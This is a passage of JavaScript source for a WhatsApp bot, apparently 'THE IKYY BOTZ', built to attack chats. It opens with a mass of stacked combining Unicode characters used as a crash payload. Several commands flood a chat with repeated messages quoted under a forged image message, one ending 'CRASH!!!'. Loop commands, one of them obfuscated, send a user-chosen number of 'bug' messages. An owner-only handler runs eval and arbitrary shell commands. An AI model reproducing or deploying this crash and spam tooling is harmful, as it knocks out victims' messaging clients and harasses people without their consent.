̵̸ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّ̢̨̛̹̲̣̖̺͔̗̥̝̤̙̘͙̗̣͌̈́̀ͩ̊͊͑ͭ̓ͮ̕͟͜͞҉̸̴ًًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̧̛̞̮͈͎̳̠̞͓̩̗̼̖̘̖̰̔̈̊͐͐̽̅̃̽͛̀͑́ͯ̊͐́͂ͭ̐͘̕̕͘͠҉̵̸̵̴̸ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̢͔̖̟͚͚͕̮̦̼̣̘̼̎̉ͨ̽ͬͤ͛̾̏ͯ͋̏͊ͥ̇̀̀͋͌͜͟͢͢͞͠͡͡҉̶ًٌٍٍَُِّ̞̖̖̹͎̓̅́͊ͮ̕͠҉̷̴̶̷ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّّ̨̖̲͚͎̳̳̤̫̮̗͇̯͚̬̿̀͗̄̐ͩͨ̓̀ͤ̓͒͘͢͟͟͠͠͞͞͠͝͏̷̷̵ًًًٌٌٍٍٍَََُُِِِّّّ͎͔̺̱̭͓̻̲̬͎̬̉̂̀ͮ̀̂̃ͩͣ̏͂ͫ̑͘͠͡͏̵̸̴̵ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̛̛̹̤̪͍̗̝̹̟̟͙͚̮͍̠̬͍͔͚̥̅̆̃̂̐͆ͦ̂̈̓ͤͦ̊̚͘͘͟͜͢͜͜͡͝͡͡҉ًَّͪ́͌͝͏̸ًٌٍَُِّ̢̯̩͖̓ͥ̿҉̸̸̴̶̴̴ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̨͕̦̺͓̥̳͈̳͉̦͍͉̦̮̑̐̑ͧͭ̎͊ͥ͋̈́̀̾̍ͬͣ̌̉̒̉͊̕͟͡͞͏̵̵̶ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّّ̡̡͕̖͉͈̯̮̳͕̪͖͊͒́ͥ̇̒ͭ̉͋͂͑͘̕͘̕͟͢͢͠ͅ͏̵̶̵̷̴̸̸ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّ̡̡̧̧̢̢̡̨̢̡̧̛̛̛̤̻͙̜̳̤͖̱̝̳̫̞̼͕͕̬̙̖̦̱̙̘̭̦̤̻̜̬̫̲̖̬̦̳͓͈̻̞̲̗͉̫͙̲̎͑̂́̂͛͒̓̋͛̊̿̉̎́́̌̇͊̊ͤ̾̔̾̓́̊̔̏̽̅̄ͩ̔̔̆̓̀ͮͭ̈̍͊͑̒̈́͑̀́̂͘̕̕͘̚̚̕͟͢͡͡͡͡͝͠͡͡ͅͅͅ҉̶̶ًًٌٌٌٍٍٍََُُِِِّّ̨̛͓̭͉͔̻̌̒͒̂͋͌͐̀ͭ͗̅͋̕͠͡҉̵̶̶ًًٌٌٍٍَََُُِِّّّ̢̤̭͇̤͓̙̹͍͓͆́ͬ̌͛̀̀͂͘̕͜͠͡͠ͅ`,
 "jpegThumbnail": virgam
 } 
 } 
 }
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐗𝐘𝐙𝐎𝐗👑"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"CRASH!!!"},{quoted:ikyenak66})
 jancok(`© THE IKYY BOTZ`)
 jancok(`© THE IKYY BOTZ`)
 }
 break
 case 'permisibang':{
 if (!isCreator && !isBan) return
   ikyenak66 = { 
   key: { 
   fromMe: false, 
   participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" }) 
  }, 
  message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption": `haloo bang :v`,
 "jpegThumbnail": virgam
 } 
 } 
 }
await ikycoli.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"abangg nya kemana ya?"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"haloo?"},{quoted:ikyenak66})
 jancok(`dahlah`)
 }
 break
 case 'tinggaldimana':{
 if (!isCreator && !isBan) return
   ikyenak66 = { 
   key: { 
   fromMe: false, 
   participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" }) 
  }, 
  message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption": `🚀🔥`,
 "jpegThumbnail": virgam
 } 
 } 
 }
await ikycoli.sendMessage(m.chat, {text:"Ohh"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Ohh"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Ohh"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Ohh"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Ohh"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Ohh"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Ohh"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Ohh"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Ohh"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Ohh"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Ohh"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Ohh"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"Ohh"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"oke"},{quoted:ikyenak66})
 jancok(`makasih`)
 }
 break
case 'ikybuggam':{
function _0x26f0(){const _0x578da9=['log','1263122PFvvob','https://youtube.com/channel/UCQmja37q_Pap24MgG0vUITQ','(((.+)+)+)+$','18SbDZFK','chat','prototype','search','reply','exception','Sukses\x20Send\x20Bug\x20Sebanyak\x20','1593613MHlstt','return\x20(function()\x20','©⏤͟͟͞𝐓𝐇𝐄\x20𝐈𝐊𝐘𝐘\x20𝐁𝐎𝐓𝐙\x0a\x0a','constructor','trace','18FhGmPG','1OZuDmW','toString','console','warn','length','3804292XidCbp','table','PHOTO','15056520QXZdvn','Jumlahnya?','4539448LSEHGG','6059375WrdXlq','2043135jmAfKH','https://telegra.ph/file/eeaf2fac29390c8e85181.jpg','info','apply','{}.constructor(\x22return\x20this\x22)(\x20)','error','bind'];_0x26f0=function(){return _0x578da9;};return _0x26f0();}const _0x4fa4d8=_0x34e4;(function(_0x2d8dad,_0xd5ecc8){const _0x4c9b48=_0x34e4,_0x3db538=_0x2d8dad();while(!![]){try{const _0x138ba0=-parseInt(_0x4c9b48(0x1cc))/0x1*(-parseInt(_0x4c9b48(0x1e0))/0x2)+parseInt(_0x4c9b48(0x1d8))/0x3+parseInt(_0x4c9b48(0x1d1))/0x4+-parseInt(_0x4c9b48(0x1d7))/0x5+parseInt(_0x4c9b48(0x1e3))/0x6*(-parseInt(_0x4c9b48(0x1ea))/0x7)+parseInt(_0x4c9b48(0x1d6))/0x8*(-parseInt(_0x4c9b48(0x1cb))/0x9)+parseInt(_0x4c9b48(0x1d4))/0xa;if(_0x138ba0===_0xd5ecc8)break;else _0x3db538['push'](_0x3db538['shift']());}catch(_0x450ec9){_0x3db538['push'](_0x3db538['shift']());}}}(_0x26f0,0xb4921));const _0x360b1d=(function(){let _0x3cb42b=!![];return function(_0x1df565,_0x198b3b){const _0x24eb04=_0x3cb42b?function(){const _0x20d113=_0x34e4;if(_0x198b3b){const _0x15ea6c=_0x198b3b[_0x20d113(0x1db)](_0x1df565,arguments);return _0x198b3b=null,_0x15ea6c;}}:function(){};return _0x3cb42b=![],_0x24eb04;};}()),_0x35e541=_0x360b1d(this,function(){const _0x22630f=_0x34e4;return _0x35e541[_0x22630f(0x1cd)]()[_0x22630f(0x1e6)](_0x22630f(0x1e2))['toString']()['constructor'](_0x35e541)['search'](_0x22630f(0x1e2));});_0x35e541();function _0x34e4(_0x3eb782,_0xf3ad5f){const _0x863b5b=_0x26f0();return _0x34e4=function(_0x2d5de5,_0x5231aa){_0x2d5de5=_0x2d5de5-0x1ca;let _0x35a42c=_0x863b5b[_0x2d5de5];return _0x35a42c;},_0x34e4(_0x3eb782,_0xf3ad5f);}const _0x5231aa=(function(){let _0xffc76a=!![];return function(_0x15946,_0x4e59a6){const _0x319c14=_0xffc76a?function(){const _0x4fdb41=_0x34e4;if(_0x4e59a6){const _0x1938e2=_0x4e59a6[_0x4fdb41(0x1db)](_0x15946,arguments);return _0x4e59a6=null,_0x1938e2;}}:function(){};return _0xffc76a=![],_0x319c14;};}()),_0x2d5de5=_0x5231aa(this,function(){const _0x40c271=_0x34e4,_0x3afc45=function(){const _0x4121f1=_0x34e4;let _0x2f2dfa;try{_0x2f2dfa=Function(_0x4121f1(0x1eb)+_0x4121f1(0x1dc)+');')();}catch(_0x3369a7){_0x2f2dfa=window;}return _0x2f2dfa;},_0x22ce1c=_0x3afc45(),_0x105e91=_0x22ce1c[_0x40c271(0x1ce)]=_0x22ce1c[_0x40c271(0x1ce)]||{},_0x14cd06=[_0x40c271(0x1df),_0x40c271(0x1cf),_0x40c271(0x1da),_0x40c271(0x1dd),_0x40c271(0x1e8),_0x40c271(0x1d2),_0x40c271(0x1ca)];for(let _0x5723e1=0x0;_0x5723e1<_0x14cd06[_0x40c271(0x1d0)];_0x5723e1++){const _0x543333=_0x5231aa[_0x40c271(0x1ed)][_0x40c271(0x1e5)][_0x40c271(0x1de)](_0x5231aa),_0x7ed2b7=_0x14cd06[_0x5723e1],_0x38e08c=_0x105e91[_0x7ed2b7]||_0x543333;_0x543333['__proto__']=_0x5231aa[_0x40c271(0x1de)](_0x5231aa),_0x543333[_0x40c271(0x1cd)]=_0x38e08c[_0x40c271(0x1cd)][_0x40c271(0x1de)](_0x38e08c),_0x105e91[_0x7ed2b7]=_0x543333;}});_0x2d5de5();{if(!isCreator&&!isBan)return;if(args[_0x4fa4d8(0x1d0)]==0x0)return m[_0x4fa4d8(0x1e7)](_0x4fa4d8(0x1d5));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){anu=_0x4fa4d8(0x1ec)+ikybabel,ikycoli['sendMessage'](m[_0x4fa4d8(0x1e4)],{'image':{'url':_0x4fa4d8(0x1d9)},'contextInfo':{'externalAdReply':{'title':''+ikybabel,'body':''+ikybabel,'previewType':_0x4fa4d8(0x1d3),'showAdAttribution':!![],'sourceUrl':_0x4fa4d8(0x1e1),'thumbnail':virgam}},'caption':anu},{'quoted':ikyzyx,'contextInfo':{}});}jancok(_0x4fa4d8(0x1e9)+jumlah);}
}
break
 case 'afahiyah':{
 if (!isCreator && !isBan) return
   ikyenak66 = { 
   key: { 
   fromMe: false, 
   participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" }) 
  }, 
  message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption": `sip`,
 "jpegThumbnail": virgam
 } 
 } 
 }
await ikycoli.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"gw sih oh aja"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"CRASH!!!"},{quoted:ikyenak66})
 jancok(`🚀🔥`)
 }
 break
 case 'itzmeiky': {            
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
             teng = `
Colii dulu deckk
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝙄𝙏𝙕 𝙈𝙀 𝙄𝙆𝙔𝙔🚀`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
}
jancok(`Sukses Send bug Sebanyak ${jumlah}`)
}
            break
case 'ikygans': {            
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
             teng = `
░░░░░░▄▄
░░░░░█░░█
▄▄▄▄▄█░░█▄▄▄
▓▓▓▓█░░░░░░░█
▓▓▓▓█░░░░░░░░█
▓▓▓▓█░░░░░░░░█
▓▓▓▓█░░░░░░░░█
███▀▀▀███████ 
`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `THE IKYY BOTZ☕`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
await ikycoli.sendMessage(m.chat, {text:teng},{quoted:ikyenak66})
}
jancok(`Sukses Send bug Sebanyak ${jumlah}`)
}
            break
            
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    ikycoli.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
